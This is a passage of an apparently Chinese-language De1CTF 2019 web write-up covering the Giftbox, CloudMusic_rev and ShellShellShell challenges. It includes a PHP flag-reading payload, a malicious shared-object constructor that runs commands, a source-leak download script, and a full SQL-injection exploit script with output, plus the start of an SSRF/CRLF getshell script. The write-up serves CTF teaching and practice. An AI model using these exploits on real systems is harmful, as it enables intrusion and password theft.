class="line">targeting(&apos;g&apos;,&apos;chdir&apos;)</span><br><span class="line">targeting(&apos;h&apos;,&apos;ini_set&apos;)</span><br><span class="line">targeting(&apos;i&apos;,&apos;file_get_&apos;)</span><br><span class="line">targeting(&apos;j&apos;,&apos;&#123;$i&#125;contents&apos;)</span><br><span class="line">targeting(&apos;k&apos;,&apos;&#123;$g($e)&#125;&apos;)</span><br><span class="line">targeting(&apos;l&apos;,&apos;&#123;$h($f,$c)&#125;&apos;)</span><br><span class="line">targeting(&apos;m&apos;,&apos;&#123;$g($c)&#125;&apos;)</span><br><span class="line">targeting(&apos;n&apos;,&apos;&#123;$h($f,$d)&#125;&apos;)</span><br><span class="line">targeting(&apos;o&apos;,&apos;&#123;$d&#125;flag&apos;)</span><br><span class="line">targeting(&apos;p&apos;,&apos;&#123;$j($o)&#125;&apos;)</span><br><span class="line">targeting(&apos;q&apos;,&apos;printf&apos;)</span><br><span class="line">targeting(&apos;r&apos;,&apos;&#123;$q($p)&#125;&apos;)</span><br><span class="line">print(launch())</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/Giftbox/img/7.png" alt="7"></p>
<p>Flag：<code>de1ctf{h3r3_y0uuur_g1fttt_0uT_0f_b0o0o0o0o0xx}</code></p>
<h2 id="CloudMusic-rev"><a href="#CloudMusic-rev" class="headerlink" title="CloudMusic_rev"></a>CloudMusic_rev</h2><p>以前 1.0 版本 writeup：</p>
<p><a href="https://github.com/impakho/ciscn2019_final_web1" target="_blank" rel="noopener">impakho/ciscn2019_final_web1</a></p>
<p>本题是 2.0 版本。</p>
<p>先审计源代码，找到首页备注里有 <code>#firmware</code> 功能。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/1.png" alt="1"></p>
<p><code>#firmware</code> 功能需要登录，而且只有管理员有权限访问。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/2.png" alt="2"></p>
<p>然后注册登录，在我的分享页面里看到一首英文歌，其它都是中文歌，而且这首英文歌在首页就已经放入到播放器列表里。</p>
<p>所以看分享 <code>#share</code> 页面源代码，能看到 <code>/media/share.php?</code> 后面还用 <code>btoa</code> 也就是 <code>base64编码</code>，所以这里不难发现有个任意文件读取。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/3.png" alt="3"></p>
<p>尝试读取 <code>../index.php</code> 页面的源代码，访问 <code>http://127.0.0.1/media/share.php?Li4vaW5kZXgucGhw</code>。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/4.png" alt="4"></p>
<p>限制了 <code>.php</code> 文件，根据提示，可以使用 <code>urlencode</code> 编码绕过。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/5.png" alt="5"></p>
<p>成功读取到 <code>../index.php</code> 文件，那么其它文件也可以读取到。</p>
<p>然后就是读取网站目录下的文件，进行源代码审计。我们的目标就是拿到管理员密码，然后访问 <code>#firmware</code> 功能。</p>
<p>那么我们需要找到源代码里，哪里读取到管理员密码，这些位置并不多。这里漏洞点在 <code>/include/upload.php</code> 里，调用到 <code>/lib/parser.so</code> 进行音频文件解析，传入了管理员密码。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/6.png" alt="6"></p>
<p>那么我们需要用 <code>IDA</code> 反编译 <code>/lib/parser.so</code> 文件，漏洞点在 <code>read_title</code> / <code>read_artist</code> / <code>read_album</code> 三个函数里的 <code>strcpy</code> 处，<code>off by null</code>，刚好可以覆盖到 <code>mem_mframe_data</code> 后面的 <code>mframe_data</code> 第一字节为 <code>0x00</code>，那么读取的时候就能读到 <code>mem_mpasswd</code>，也就是 <code>管理员密码</code>。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/7.png" alt="7"></p>
<p>相对于 1.0 版本，这是一个错误版本的 <code>parser.so</code>，因为它使用 <code>strlen</code> 获取字符串长度，致使 <code>unicode</code> 编码的字段无法正常读取，影响到一些 <code>mp3</code> 的信息读取，间接上增加了做题的难度。</p>
<p>那么我们可以构造字符串长度为 <code>0x70</code> 的字段，然后上传构造好的 <code>mp3</code> 文件，就能读取 <code>管理员密码</code>。</p>
<p>构造好的 <code>mp3</code> 文件见 <code>exp</code> 里。</p>
<p>我们使用 <code>管理员密码</code> 登录管理员账号，访问 <code>#firmware</code> 功能。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/8.png" alt="8"></p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/9.png" alt="9"></p>
<p>泄露这个页面的源代码文件，审计源代码，这里我们可以上传一个 <code>.so</code> 文件，然后猜文件名，然后可以加载这个 <code>.so</code> 文件。</p>
<p>那么我们可以使用 <code>__attribute__ ((constructor))</code> 来执行我们的代码。</p>
<p>就像这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">char _version[0x130];</span><br><span class="line">char * version = &amp;_version;</span><br><span class="line"></span><br><span class="line">__attribute__ ((constructor)) void fun()&#123;</span><br><span class="line">    memset(version,0,0x130);</span><br><span class="line">    FILE * fp=popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (fp==NULL) return;</span><br><span class="line">    fread(version, 1, 0x100, fp);</span><br><span class="line">    pclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/web/CloudMusic_rev/img/10.png" alt="10"></p>
<p>但是相对于 <code>1.0</code> 版本，这里没有回显。</p>
<p>所以我们可以向 <code>/uploads/firmware/</code> 或者 <code>/uploads/music/</code> 下写文件，然后去访问来读取到回显信息。</p>
<p><code>www-data</code> 用户，对 <code>/flag</code> 文件没有读取权限。</p>
<p>我们需要找到一个具有 <code>suid</code> 权限的程序去读取，<code>/usr/bin/tac</code> 具有 <code>suid</code> 权限，能够读取到 <code>/flag</code> 文件的内容。</p>
<p>所以我们可以用 <code>/usr/bin/tac /flag &gt; /var/www/html/uploads/firmware/xxxxx</code> 去读取到 <code>flag</code> 文件。</p>
<p>Flag：<code>de1ctf{W3b_ANND_PWNNN_C1ou9mus1c_revvvv11}</code></p>
<h2 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h2><p>解题思路：赛题分为两层，需要先拿到第一层的webshell，然后做好代理，渗透内网获取第二层的webshell，最后在内网的主机中找到flag文件获取flag。(以下给出的脚本文件当中ip地址需要进行对应的修改)</p>
<p>第一层获取webshell主要通过以下的步骤：<br>1.可利用swp源码泄露，获取所有的源码文件。<br>2.利用insert sql注入拿到管理员的密码md5值，然后在md5网站上解密得到密码明文。<br>3.利用反序列化漏洞调用内置类<code>SoapClient</code>触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。<br>4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。</p>
<p>获取泄露的swp文件的脚本<code>GetSwp.py</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"># import requests</span><br><span class="line">import urllib</span><br><span class="line">import os</span><br><span class="line">os.system(&apos;mkdir source&apos;)</span><br><span class="line">os.system(&apos;mkdir source/views&apos;)</span><br><span class="line">file_list=[&apos;.index.php.swp&apos;,&apos;.config.php.swp&apos;,&apos;.user.php.swp&apos;,&apos;user.php.bak&apos;,&apos;views/.delete.swp&apos;,&apos;views/.index.swp&apos;,&apos;views/.login.swp&apos;,&apos;views/.logout.swp&apos;,&apos;views/.profile.swp&apos;,&apos;views/.publish.swp&apos;,&apos;views/.register.swp&apos;]</span><br><span class="line">part_url=&apos;http://45.76.187.90:11027/&apos;</span><br><span class="line">for i in file_list:</span><br><span class="line">    url=part_url+i</span><br><span class="line">    print &apos;download %s &apos;% url</span><br><span class="line">    os.system(&apos;curl &apos;+url+&apos;&gt;source/&apos;+i)</span><br></pre></td></tr></table></figure></p>
<h4 id="sql注入点分析"><a href="#sql注入点分析" class="headerlink" title="sql注入点分析"></a>sql注入点分析</h4><p>先在<code>config.php</code>看到了全局过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_deep'</span>, $value) : addslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET))</span><br><span class="line">        &#123;</span><br><span class="line">            $_GET  = addslashes_deep($_GET);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST))</span><br><span class="line">        &#123;</span><br><span class="line">            $_POST = addslashes_deep($_POST);</span><br><span class="line">        &#125;</span><br><span class="line">        $_COOKIE   = addslashes_deep($_COOKIE);</span><br><span class="line">        $_REQUEST  = addslashes_deep($_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">addsla_all();</span><br></pre></td></tr></table></figure></p>
<p>这样过滤之后，简单的注入就不存在了。<br>在<code>user.php</code>中看到<code>insert</code>函数，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_column</span><span class="params">($columns)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($columns))</span><br><span class="line">            $column = <span class="string">' `'</span>.implode(<span class="string">'`,`'</span>,$columns).<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $column = <span class="string">' `'</span>.$columns.<span class="string">'` '</span>;</span><br><span class="line">        <span class="keyword">return</span> $column;</span><br><span class="line">    &#125;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line">        $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">        $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">        $nid =</span><br><span class="line">        $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>看对<code>$value</code>的操作，先将<code>$value</code>数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$value[0]`,`$value[1]`，`$value[1]`</span><br></pre></td></tr></table></figure></p>
<p>然后再执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br></pre></td></tr></table></figure></p>
<p>preg_replace的意图是把反引号的单引号进行替换（核心操作是如果一对反引号中间的内容不存在逗号和反引号，就把反引号变为单引号,所以<code>$value</code>就变为了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;$value[0]&apos;,&apos;$value[1]&apos;，&apos;$value[1]&apos;)</span><br></pre></td></tr></table></figure>
<p>但是如果<code>$value</code>元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考虑$value为 : array(&quot;admin`,`1`)#&quot;,&quot;password&quot;)</span><br><span class="line">经过处理后，就变为了 : (&apos;admin&apos;,&apos;1&apos;)#`,&apos;password&apos; )</span><br><span class="line">相当于闭合了单引号，造成注入。</span><br></pre></td></tr></table></figure></p>
<p>看到<code>insert</code>函数在<code>publish</code>函数中被调用，并且存在<code>$_POST[&#39;signature&#39;]</code>变量可控，注入点就在这里：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br></pre></td></tr></table></figure></p>
<p>实质是把$value中的反引号替换为单引号时，如果$value中本来就带有反引号，就有可能导致注入(addslashes函数不会对反引号过滤)</p>
<h4 id="sql-exp-py"><a href="#sql-exp-py" class="headerlink" title="sql_exp.py"></a>sql_exp.py</h4><p>利用sql注入漏洞注入出管理员账号密码的脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import subprocess</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">_target=&apos;http://20.20.20.128:11027/index.php?action=&apos;</span><br><span class="line"></span><br><span class="line">def get_code_dict():</span><br><span class="line">    c = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&apos;</span><br><span class="line">    captchas = [&apos;&apos;.join(i) for i in product(c, repeat=3)]</span><br><span class="line"></span><br><span class="line">    print &apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas))</span><br><span class="line">    with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">        for k in captchas:</span><br><span class="line">            f.write(hashlib.md5(k).hexdigest()+&apos; --&gt; &apos;+k+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">def get_creds():</span><br><span class="line">    username = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    password = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    return username, password</span><br><span class="line"></span><br><span class="line">def solve_code(html):</span><br><span class="line">    code = re.search(r&apos;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]&#123;5&#125;)\)&apos;, html).group(1)</span><br><span class="line">    solution = subprocess.check_output([&apos;grep&apos;, &apos;^&apos;+code, &apos;captchas.txt&apos;]).split()[2]</span><br><span class="line">    return solution</span><br><span class="line"></span><br><span class="line">def register(username, password):</span><br><span class="line">    resp = sess.get(_target+&apos;register&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_target+&apos;register&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    resp = sess.get(_target+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_target+&apos;login&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def publish(sig, mood):</span><br><span class="line">    return sess.post(_target+&apos;publish&apos;, data=&#123;&apos;signature&apos;:sig,&apos;mood&apos;:mood&#125;)</span><br><span class="line"></span><br><span class="line">get_code_dict()</span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line">username, password = get_creds()</span><br><span class="line">print &apos;[+] register(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">register(username, password)</span><br><span class="line">print &apos;[+] login(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">login(username, password)</span><br><span class="line">print &apos;[+] user session =&gt; &apos; + sess.cookies.get_dict()[&apos;PHPSESSID&apos;]</span><br><span class="line"></span><br><span class="line">for i in range(1,33): # we know password is 32 chars (md5)</span><br><span class="line">    mood = &apos;(select concat(`O:4:\&quot;Mood\&quot;:3:&#123;&#123;s:4:\&quot;mood\&quot;;i:`,ord(substr(password,&#123;&#125;,1)),`;s:2:\&quot;ip\&quot;;s:14:\&quot;80.212.199.161\&quot;;s:4:\&quot;date\&quot;;i:1520664478;&#125;&#125;`) from ctf_users where is_admin=1 limit 1)&apos;.format(i)</span><br><span class="line">    payload = &apos;a`, &#123;&#125;); -- -&apos;.format(mood)</span><br><span class="line">    resp = publish(payload, &apos;0&apos;)</span><br><span class="line"></span><br><span class="line">resp = sess.get(_target+&apos;index&apos;)</span><br><span class="line">moods = re.findall(r&apos;img/([0-9]+)\.gif&apos;, resp.text)[::-1] # last publish will be read first in the html</span><br><span class="line">admin_hash = &apos;&apos;.join(map(lambda k: chr(int(k)), moods))</span><br><span class="line"></span><br><span class="line">print &apos;[+] admin hash =&gt; &apos; + admin_hash</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali64:~# python sql_exp.py </span><br><span class="line">[+] Genering 778688 captchas...</span><br><span class="line">[+] register(cvnyshokxj, sjt0ayo3c1)</span><br><span class="line">[+] login(cvnyshokxj, sjt0ayo3c1)</span><br><span class="line">[+] user session =&gt; 7fublips3949q8vcs611fcdha2</span><br><span class="line">[+] admin hash =&gt; c991707fdf339958eded91331fb11ba0</span><br></pre></td></tr></table></figure>
<p>密码明文为<code>jaivypassword</code></p>
<h4 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell_1"></a>getshell_1</h4><p>3.利用反序列化漏洞调用内置类<code>SoapClient</code>触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。<br>4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。</p>
<p>原理:要触发这个反序列化漏洞+SSRF+CRLF漏洞登录admin，需要先利用<code>/index.php?action=publish</code>的sql注入漏洞把序列化数据插入数据库中，然后再调用<code>/index.php?action=index</code>，这时会触发代码<code>$data = $C-&gt;showmess();</code>，进而执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$mood = unserialize($row[2]);</span><br><span class="line">$country = $mood-&gt;getcountry();</span><br></pre></td></tr></table></figure></p>
<p>这时就会触发反序列化漏洞–&gt;SSRF漏洞–&gt;CLRF漏洞–&gt;登录admin。</p>
<p>关于第一层解题更详细的分析可以参见@wupco师傅的这篇文章<code>https://xz.aliyun.com/t/2148</code></p>
<h4 id="ssrf-crlf-getshell-exp-py"><a href="#ssrf-crlf-getshell-exp-py" class="headerlink" title="ssrf_crlf_getshell_exp.py"></a>ssrf_crlf_getshell_exp.py</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line">import requests</span><br><span class="line">import subprocess</span><br><span class="line">from itertools import product</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">_target = &apos;http://20.20.20.128:11027/&apos;</span><br><span class="line">_action = _target + &apos;index.php?action=&apos;</span><br><span class="line"></span><br><span class="line">def get_code_dict():</span><br><span class="line">    c = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&apos;</span><br><span class="line">    captchas = [&apos;&apos;.join(i) for i in product(c, repeat=3)]</span><br><span class="line"></span><br><span class="line">    print &apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas))</span><br><span class="line">    with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">        for k in captchas:</span><br><span class="line">            f.write(hashlib.md5(k).hexdigest()+&apos; --&gt; &apos;+k+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_creds():</span><br><span class="line">    username = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    password = &apos;&apos;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))</span><br><span class="line">    return username, password</span><br><span class="line"></span><br><span class="line">#code</span><br><span class="line">def solve_code(html):</span><br><span class="line">    code = re.search(r&apos;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]&#123;5&#125;)\)&apos;, html).group(1)</span><br><span class="line">    solution = subprocess.check_output([&apos;grep&apos;, &apos;^&apos;+code, &apos;captchas.txt&apos;]).split()[2]</span><br><span class="line">    return solution</span><br><span class="line"></span><br><span class="line">def register(username, password):</span><br><span class="line">    resp = sess.get(_action+&apos;register&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+&apos;register&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def login(username, password):</span><br><span class="line">    resp = sess.get(_action+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+&apos;login&apos;, data=&#123;&apos;username&apos;:username,&apos;password&apos;:password,&apos;code&apos;:code&#125;)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def publish(sig, mood):</span><br><span class="line">    return sess.post(_action+&apos;publish&apos;, data=&#123;&apos;signature&apos;:sig,&apos;mood&apos;:mood&#125;)#, proxies=&#123;&apos;http&apos;:&apos;127.0.0.1:8080&apos;&#125;)</span><br><span class="line"></span><br><span class="line">def get_prc_now():</span><br><span class="line">    # date_default_timezone_set(&quot;PRC&quot;) is not important</span><br><span class="line">    return subprocess.check_output([&apos;php&apos;, &apos;-r&apos;, &apos;date_default_timezone_set(&quot;PRC&quot;); echo time();&apos;])</span><br><span class="line"></span><br><span class="line">def get_admin_session():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    resp = sess.get(_action+&apos;login&apos;)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    return sess.cookies.get_dict()[&apos;PHPSESSID&apos;], code</span><br><span class="line"></span><br><span class="line">get_code_dict()</span><br><span class="line"></span><br><span class="line">print &apos;[+] creating user session to trigger ssrf&apos;</span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">username, password = get_creds()</span><br><span class="line"></span><br><span class="line">print &apos;[+] register(&#123;&#125;, &#123;&#125;)&apos;.format(username, password)</span><br><span class="line">register(username, password)</span><br><span class="line"></span><br><span class="line">print &apos;[+] 